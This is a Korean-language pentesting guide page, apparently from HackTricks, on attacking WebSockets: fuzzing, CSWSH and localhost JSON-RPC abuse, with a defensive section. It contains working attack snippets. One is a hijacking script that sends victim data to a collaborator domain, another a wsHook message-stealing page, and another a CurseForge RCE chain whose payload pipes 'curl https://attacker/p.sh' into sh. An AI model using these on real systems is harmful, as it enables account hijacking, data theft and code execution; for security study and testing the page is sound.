# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## WebSockets란 무엇인가

WebSocket 연결은 초기 **HTTP** 핸드셰이크를 통해 성립되며, 트랜잭션 시스템을 필요로 하지 않고 언제든지 양방향 메시징이 가능한 **장기 지속** 형태로 설계되어 있습니다. 이로 인해 WebSockets는 **저지연 또는 서버-발신 통신**을 필요로 하는 애플리케이션(예: 실시간 금융 데이터 스트림)에 특히 유리합니다.

### WebSocket 연결 수립

WebSocket 연결 수립에 관한 자세한 설명은 [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)에서 확인할 수 있습니다. 요약하면, WebSocket 연결은 일반적으로 아래와 같이 클라이언트 측 JavaScript를 통해 시작됩니다:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
The `wss` protocol signifies a WebSocket connection secured with **TLS**, whereas `ws` indicates an **보호되지 않은** connection.

연결 수립 동안, 브라우저와 서버는 HTTP를 통해 핸드셰이크를 수행합니다. 핸드셰이크 과정은 브라우저가 요청을 보내고 서버가 응답하는 방식이며, 다음 예시에 나와 있습니다:

브라우저가 핸드셰이크 요청을 보냅니다:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
서버의 핸드셰이크 응답:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
연결이 수립되면 양방향으로 메시지를 교환하기 위해 연결 상태가 유지됩니다.

**WebSocket 핸드셰이크의 핵심 포인트:**

- `Connection` 및 `Upgrade` 헤더는 WebSocket 핸드셰이크의 시작을 알립니다.
- `Sec-WebSocket-Version` 헤더는 원하는 WebSocket 프로토콜 버전을 나타내며, 일반적으로 `13`입니다.
- `Sec-WebSocket-Key` 헤더에는 Base64로 인코딩된 랜덤 값이 전송되어 각 핸드셰이크가 고유하도록 하며, 이는 캐싱 프록시와 관련된 문제를 방지하는 데 도움이 됩니다. 이 값은 인증용이 아니며 응답이 잘못 구성된 서버나 캐시에서 생성된 것이 아님을 확인하기 위한 것입니다.
- 서버 응답의 `Sec-WebSocket-Accept` 헤더는 `Sec-WebSocket-Key`의 해시로, 서버가 WebSocket 연결을 열려는 의도가 있음을 검증합니다.

이러한 특성들은 핸드셰이크 과정을 안전하고 신뢰할 수 있게 하여 효율적인 실시간 통신을 가능하게 합니다.

### Linux 콘솔

`websocat`을 사용해 websocket과 원시 연결을 설정할 수 있습니다.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
또는 websocat 서버를 생성하려면:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket 연결

현재 로컬 네트워크에서 클라이언트들이 **HTTP websocket**에 연결되어 있는 것을 발견하면, 클라이언트와 서버 사이에서 MitM attack을 수행하기 위해 [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)을 시도할 수 있습니다.\
클라이언트가 당신에게 연결을 시도하면 다음을 사용할 수 있습니다:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

다음 **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS)를 사용하면 websockets에서 알려진 **vulnerabilities**를 자동으로 발견하고, fingerprint하며 검색할 수 있습니다.

### Websocket 디버그 도구

- **Burp Suite**는 일반적인 HTTP 통신에서와 매우 유사한 방식으로 MitM websockets 통신을 지원합니다.
- [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension**은 Burp에서 Websocket 통신을 더 잘 관리할 수 있게 해주며, **history**를 확인하고, **interception rules**를 설정하며, **match and replace** 규칙을 사용하고 **Intruder** 및 **AutoRepeater**를 사용할 수 있게 해줍니다.
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** '**WebSocket/Socket.io Proxy**'의 약자로, Node.js로 작성된 이 도구는 클라이언트와 서버 간의 모든 WebSocket 및 Socket.IO 통신을 확인하고, **capture, intercept, send custom** 메시지를 보낼 수 있는 사용자 인터페이스를 제공합니다.
- [**wsrepl**](https://github.com/doyensec/wsrepl)는 pentesting을 위해 특별히 설계된 **interactive websocket REPL**입니다. 이는 **incoming websocket messages and sending new ones**를 관찰하기 위한 인터페이스와 이 통신을 **automating**하기 위한 사용하기 쉬운 프레임워크를 제공합니다.
- [**https://websocketking.com/**](https://websocketking.com/)는 **web to communicate** with other webs using **websockets**를 제공하는 웹사이트입니다.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket)는 다른 유형의 통신/프로토콜 중에서도 **web to communicate** with other webs using **websockets**를 제공합니다.

## Websocket 복호화

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket 실습

In [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course)에는 websockets를 사용하여 웹을 실행하는 코드가 있고, [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)에서 설명을 확인할 수 있습니다.

## Websocket Fuzzing

Burp 확장인 [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner)는 이제 WebSocket 메시지도 fuzz할 수 있게 합니다. 자세한 정보는 [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner)에서 읽을 수 있습니다.

### WebSocket Turbo Intruder (Burp extension)

PortSwigger의 WebSocket Turbo Intruder는 Turbo Intruder 스타일의 Python 스크립팅과 고속의 fuzzing을 WebSockets에 제공합니다. BApp Store 또는 소스에서 설치하세요. 구성 요소는 다음 두 가지입니다:

- Turbo Intruder: custom engines를 사용하여 단일 WS endpoint에 고용량 메시징을 수행합니다.
- HTTP Middleware: 로컬 HTTP endpoint를 노출하여 바디를 지속 연결을 통해 WS 메시지로 전달하므로, 어떤 HTTP 기반 스캐너도 WS 백엔드를 탐색할 수 있습니다.

WS endpoint를 fuzz하고 관련 응답을 필터링하기 위한 기본 스크립트 패턴:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
한 메시지가 여러 응답을 유발할 때 발생하는 노이즈를 줄이기 위해 `@MatchRegex(...)` 같은 데코레이터를 사용하세요.

### WS를 HTTP 뒤에 브리지하기 (HTTP 미들웨어)

지속적인 WS 연결을 래핑하고 HTTP 본문을 WS 메시지로 전달하여 HTTP 스캐너로 자동화된 테스트를 수행합니다:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
그런 다음 로컬로 HTTP를 전송하세요; 본문이 WS 메시지로 전달됩니다:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
이렇게 하면 WS 백엔드를 제어하면서 '관심 있는' 이벤트(예: SQLi errors, auth bypass, command injection behavior)를 필터링할 수 있습니다.

### Socket.IO 처리 (handshake, heartbeats, events)

Socket.IO는 WS 위에 자체 프레이밍을 추가합니다. 필수 쿼리 파라미터 `EIO`(예: `EIO=4`)를 통해 이를 감지하세요. Keep the session alive with Ping (`2`) and Pong (`3`) and start the conversation with `"40"`, then emit events like `42["message","hello"]`.

Intruder 예시:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTP 어댑터 변형:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Socket.IO를 통한 서버 측 prototype pollution 탐지

PortSwigger의 safe detection technique을 따라, 다음과 같은 payload를 전송해 Express internals를 오염시켜 보세요:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
만약 인사나 동작이 변경되는 경우(예: echo에 "Polluted"가 포함되는 등), 서버 측 프로토타입을 오염시켰을 가능성이 큽니다. 영향은 도달 가능한 sinks에 따라 달라지며; Node.js prototype pollution 섹션의 gadgets와 연관 지어 보세요. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

기본 엔진은 메시지를 한 연결에 배치(batched)합니다(처리량은 좋지만 레이스에는 부적합). THREADED 엔진을 사용해 다수의 WS 연결을 생성하고 페이로드를 병렬로 발사하여 로직 레이스(double‑spend, token reuse, state desync)를 유발하세요. 예제 스크립트에서 시작하고 `config()`에서 동시성을 조정하세요.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

헤더에 거대한 페이로드 길이를 선언하지만 바디는 전송하지 않는 WS 프레임을 생성하세요. 일부 WS 서버는 길이를 신뢰해 버퍼를 미리 할당하므로 `Integer.MAX_VALUE` 근처로 설정하면 Out‑Of‑Memory가 발생해 원격 인증 없는 DoS를 일으킬 수 있습니다. 예제 스크립트를 참조하세요.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- WS Logger를 활성화해 내부 IDs를 사용하여 메시지를 캡처하고 연관시키세요.
- 복잡한 어댑터에서 메시지 ID 처리를 조정하려면 `Connection`의 `inc*`/`dec*` 헬퍼를 사용하세요.
- `@PingPong`/`@Pong` 같은 데코레이터와 `isInteresting()` 같은 헬퍼는 노이즈를 줄이고 세션을 유지하는 데 도움이 됩니다.

### Operational safety

고빈도 WS 퍼징은 많은 연결을 열고 초당 수천 건의 메시지를 전송할 수 있습니다. 잘못된 프레임과 높은 전송률은 실제 DoS를 초래할 수 있습니다. 허가된 환경에서만 실행하세요.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, also known as **cross-origin WebSocket hijacking**, is identified as a specific case of **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** affecting WebSocket handshakes. 이 취약점은 WebSocket 핸드셰이크가 **HTTP cookies**만으로 인증되고 **CSRF tokens** 같은 보안 조치가 없는 경우 발생합니다.

공격자는 취약한 애플리케이션으로 교차 사이트 WebSocket 연결을 시작하는 **악성 웹 페이지**를 호스팅하여 이를 악용할 수 있습니다. 결과적으로 이 연결은 피해자의 세션 일부로 취급되어 세션 처리 메커니즘에서 CSRF 보호가 부족한 점을 악용합니다.

이 공격이 성공하려면 다음 요건이 필요합니다:

- websocket **authentication must be cookie based**
- cookie는 공격자 서버에서 접근 가능해야 합니다(보통 **`SameSite=None`**을 의미)이고, Firefox에서 **Firefox Total Cookie Protection**이 활성화되어 있지 않아야 하며 Chrome에서 **blocked third-party cookies**가 차단되어 있지 않아야 합니다.
- websocket 서버는 연결의 origin을 확인하지 않아야 하거나(또는 이를 우회할 수 있어야) 합니다.

또한:

- 인증이 로컬 연결(to localhost or to a local network)에 기반한 경우, 현재 어떤 보호도 이를 금지하지 않으므로 공격은 **가능합니다** (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

웹소켓 연결을 수립할 때 **cookie**가 서버로 전송된다는 점을 유의하세요. 해당 **server**는 전송된 cookie를 기반으로 각 특정 **user**의 **websocket session**을 연관시키는 데 이를 사용할 수 있습니다.

예를 들어, websocket server가 "READY"라는 msg가 전송되면 특정 사용자의 대화 기록을 반환한다면, 단순한 XSS로 연결을 수립하고(cookie는 피해자 사용자 인증을 위해 자동으로 전송됩니다) "READY"를 전송하면 대화 기록을 조회할 수 있습니다.:
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

이 블로그 포스트 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)에서 공격자는 웹소켓 통신이 발생하던 도메인의 한 **subdomain**에서 **execute arbitrary Javascript in a subdomain**을 성공시켰습니다. subdomain이었기 때문에 **cookie**가 전송되었고, **Websocket didn't check the Origin properly**로 인해 해당 Websocket과 통신하여 **steal tokens from it**할 수 있었습니다.

### Stealing data from user

모방하려는 웹 애플리케이션(예: .html 파일들)을 복사한 다음, websocket 통신이 이루어지는 스크립트 내부에 다음 코드를 추가하세요:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
이제 `wsHook.js` 파일을 [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook)에서 다운로드하고 **web files가 있는 폴더에 저장**하세요.\
web application을 노출시키고 사용자가 접속하게 하면 websocket을 통해 전송 및 수신되는 메시지를 훔칠 수 있습니다:
```javascript
sudo python3 -m http.server 80
```
### CSWSH 보호

CSWSH 공격은 사용자가 이미 접속한 웹페이지로 **사용자가 악성 페이지에 연결**하고, 그 페이지가 사용자가 이미 연결되어 있는 웹페이지에 **웹소켓 연결을 연다**면 요청이 사용자의 쿠키를 전송하여 공격자가 사용자로 인증되는 사실에 기반한다.

오늘날, 이 문제는 다음과 같이 쉽게 방지할 수 있다:

- **웹소켓 서버에서 Origin 확인**: 웹소켓 서버는 예상치 못한 페이지의 연결을 막기 위해 사용자가 어디에서 연결되는지 항상 확인해야 한다.
- **Authentication token**: 인증을 쿠키에 기반하지 말고, 공격자가 모르는 서버가 사용자에게 생성한 토큰(예: anti-CSRF token)을 웹소켓 연결에 사용할 수 있다.
- **SameSite Cookie attribute**: `SameSite` 값이 `Lax` 또는 `Strict`인 쿠키는 외부 공격자의 페이지에서 피해 서버로 전송되지 않으므로 쿠키 기반 인증은 성공하지 못한다. 참고로 Chrome은 이 플래그가 지정되지 않은 쿠키에 기본적으로 **`Lax`** 값을 부여해 기본적으로 더 안전하게 만들고 있다. 다만 쿠키 생성 후 최초 2분 동안은 값이 **`None`**이 되어 그 제한된 기간 동안 취약해지며(또한 이 조치가 언젠가 제거될 것으로 예상된다).
- **Firefox Total Cookie Protection**: Total Cookie Protection은 쿠키를 생성된 사이트에 격리함으로써 동작한다. 본질적으로 각 사이트는 서드파티가 사용자의 탐색 기록을 연결하지 못하도록 자체 쿠키 저장 파티션을 가진다. 이로 인해 공격자 사이트는 쿠키에 접근할 수 없어 **CSWSH 사용 불가**가 된다.
- **Chrome third-party cookies block**: 이 설정은 `SameSite=None`인 경우에도 인증된 사용자의 쿠키가 웹소켓 서버로 전송되는 것을 막을 수 있다.

### Localhost WebSocket abuse & browser port discovery

Desktop launchers는 종종 JSON-RPC WebSockets를 `127.0.0.1:<random_port>`에서 노출하는 헬퍼(예: CurseForge의 `CurseAgent.exe`)를 띄운다. 브라우저는 **로컬루프 소켓에 대해 SOP를 강제하지 않는다**, 따라서 어떤 웹페이지든 핸드셰이크를 시도할 수 있다. 에이전트가 임의의 `Origin` 값을 수락하고 이차 인증을 건너뛰면, IPC 면은 JavaScript에서 직접 원격 제어 가능해진다.

#### Enumerating exposed methods

정상 세션을 캡처하여 프로토콜 계약을 파악하라. 예를 들어 CurseForge는 `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}`와 같은 프레임을 내뿜으며, 여기서 `name`은 RPC 메서드이고 `args`는 구조화된 객체들(GUID, 해상도, 플래그 등)을 포함한다. 이 형태를 알게 되면 삽입된 페이지에서 바로 `createModpack`, `minecraftGetDefaultLocation` 또는 다른 권한 있는 작업들을 호출할 수 있다.

#### Browser-based port discovery

헬퍼가 임의의 높은 포트에 바인딩하기 때문에, 익스플로잇은 먼저 WebSockets를 통해 localhost를 무차별 검사한다. Chromium 기반 브라우저는 스로틀링 전 약 16k 실패한 업그레이드를 허용하므로 에페메랄 범위를 탐색하기에 충분하다; Firefox는 수백 건의 실패 후 크래시나 프리징이 발생하는 경향이 있어 실제 PoCs는 주로 Chromium을 목표로 한다.

<details>
<summary>간단한 브라우저 스캐너</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

핸드셰이크를 통과하고 프로토콜별 데이터를 반환하는 연결이 확보되면, 해당 소켓을 RPC 체인에 재사용하세요.

#### JSON-RPC 메서드를 RCE로 체이닝

The CurseForge exploit은 인증되지 않은 두 개의 호출을 체인합니다:

1. `createModpack` → 사용자 상호작용 없이 새로운 `MinecraftInstanceGuid`를 반환합니다.
2. `minecraftTaskLaunchInstance` → 해당 GUID를 시작하며 `AdditionalJavaArguments`를 통해 임의의 JVM 플래그를 허용합니다.

JNI/JVM 진단 옵션은 즉시 사용 가능한 RCE primitive를 제공합니다. 예를 들어, metaspace를 제한해 크래시를 유발하고 error hook을 이용해 명령을 실행할 수 있습니다:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Unix 대상에서는 페이로드를 `/bin/sh -c 'curl https://attacker/p.sh | sh'`로 단순히 교체하면 된다. 애플리케이션 코드를 수정할 수 없는 경우에도 JVM CLI를 제어하는 것만으로 이 방법이 작동한다.

이 “create resource → privileged launch” 패턴은 업데이터와 런처에서 자주 나타난다. (1)번 방식이 서버에서 추적하는 식별자를 반환하고 (2)번 방식이 해당 식별자를 사용해 코드 실행이나 프로세스 생성을 수행할 때마다, 사용자 제어 인수를 주입할 수 있는지 확인하라.


## 경쟁 상태

WebSockets에서의 레이스 컨디션도 존재하니, 자세한 내용은 [이 정보를 확인하라](race-condition.md#rc-in-websockets).

## 기타 취약점

Web Sockets는 **서버 측과 클라이언트 측으로 데이터를 전송하는** 메커니즘이므로, 서버와 클라이언트가 정보를 처리하는 방식에 따라, Web Sockets는 **websocket으로부터 전달된 사용자의 입력을 이용해 XSS, SQLi 또는 기타 일반적인 웹 취약점**을 악용하는 데 사용될 수 있다.

## **WebSocket Smuggling**

이 취약점은 **reverse proxies 제한을 우회**할 수 있게 하여, 실제로 그렇지 않더라도 **websocket 통신이 성립되었다고** 믿게 만들 수 있다. 이로 인해 공격자가 **숨겨진 엔드포인트에 접근**할 수 있게 된다. 자세한 정보는 다음 페이지를 확인하라:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## 참고자료

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
